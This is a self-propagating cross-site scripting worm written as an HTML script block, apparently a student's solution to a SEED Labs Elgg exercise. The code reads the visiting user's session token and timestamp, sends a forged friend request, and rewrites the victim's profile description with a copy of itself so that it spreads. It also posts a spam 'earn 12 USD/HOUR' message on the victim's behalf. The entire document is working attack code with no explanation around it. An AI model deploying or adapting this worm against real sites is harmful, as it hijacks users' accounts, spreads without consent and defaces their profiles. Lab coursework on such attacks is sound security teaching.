<script id="worm" type="text/javascript">


	window.onload = function(){

        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = headerTag + jsCode + tailTag;
        // alert(jsCode);

        // description = warmcode
        

        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token

        var ts = elgg.security.token.__elgg_ts;
        var token = elgg.security.token.__elgg_token;
        var sessionUser_id = elgg.session.user.guid;
        var sessionUser_name = elgg.session.user.name;
        var owner_id = elgg.page_owner.guid;
        var owner_name = elgg.page_owner.name;

        if(sessionUser_id == owner_id) return;

        // add Samy as a friend
        var addFriendURL=`http://www.seed-server.com/action/friends/add?friend=59${ts}${token}`; //FILL IN

        //Construct the HTTP request to add Samy as a friend.
     
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",addFriendURL,true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
        

        // Change information of the profile of session user

        //Construct the content of profile
        var briefdescription = "a brief description of 1905120";
        var location = "Khagracharri";
        var interests = "no interest";
        var skills = "no skills";
        var contactemail = "120@gmail.com";
        var phone = "017XXXXXXXX";
        var mobile = "017XXXXXXXX";
        var website = "www.1905120.com";
        var twitter = "1905120";

        var content_array = [];


        var attributes = {
            '__elgg_token': token,
            '__elgg_ts': ts,
            'name': sessionUser_name,
            'description': wormCode,  // wormCode to make the profile self-propagating
            'accesslevel[description]': 1,
            'briefdescription': briefdescription,
            'accesslevel[briefdescription]': 1,
            'location': location,
            'accesslevel[location]': 1,
            'interests': interests,
            'accesslevel[interests]': 1,
            'skills': skills,
            'accesslevel[skills]': 1,
            'contactemail': contactemail,
            'accesslevel[contactemail]': 1,
            'phone': phone,
            'accesslevel[phone]': 1,
            'mobile': mobile,
            'accesslevel[mobile]': 1,
            'website': website,
            'accesslevel[website]': 1,
            'twitter': twitter,
            'accesslevel[twitter]': 1,
            'guid': sessionUser_id
        }


        for (var attribute in attributes) {
            content_array.push(`${encodeURIComponent(attribute)}=${encodeURIComponent(attributes[attribute])}`);
        }


        //Construct the content of your url.
        var editProfileURL='http://www.seed-server.com/action/profile/edit'; //FILL IN
        var content_editProfile = content_array.join("&"); //FILL IN
        
       
        //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",editProfileURL,true);
        // Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type",
        "application/x-www-form-urlencoded;charset=UTF-8");
        Ajax.send(content_editProfile);
        

        // Post on thewire

        var content_array_post = [];

        var post_profile = "To earn 12 USD/HOUR(!), visit now: http://www.seed-server.com/profile/"+ sessionUser_name;


        var attributes_post = {
            '__elgg_token': token,
            '__elgg_ts': ts,
            'body': post_profile,
        }


        for (var attribute in attributes_post) {
            content_array_post.push(`${encodeURIComponent(attribute)}=${encodeURIComponent(attributes_post[attribute])}`);
        }


        //Construct the content of your url.
        var sendurl_post='http://www.seed-server.com/action/thewire/add'; //FILL IN
        var content_post = content_array_post.join("&"); //FILL IN
        
     
        //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl_post,true);
        // Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type",
        "application/x-www-form-urlencoded;charset=UTF-8");
        Ajax.send(content_post);
	}

</script>